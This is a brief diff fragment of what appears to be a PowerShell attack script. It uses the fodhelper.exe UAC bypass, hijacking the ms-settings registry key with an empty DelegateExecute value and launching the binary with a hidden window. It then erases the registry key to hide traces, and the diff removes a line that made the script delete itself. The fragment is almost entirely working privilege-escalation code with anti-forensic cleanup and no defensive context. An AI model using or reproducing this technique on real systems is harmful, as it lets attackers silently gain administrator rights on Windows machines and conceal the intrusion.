@@ -20,5 +20,3 @@ New-ItemProperty -Path $regPath -Name "DelegateExecute" -Value "" -PropertyType 
 Start-Process "C\Windows\System32\fodhelper.exe" -WindowStyle Hidden
 
 Start-Job -ScriptBlock { Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue } | Out-Null
-
-Remove-Item -Path $PSCommandPath -Force -ErrorAction SilentlyContinue
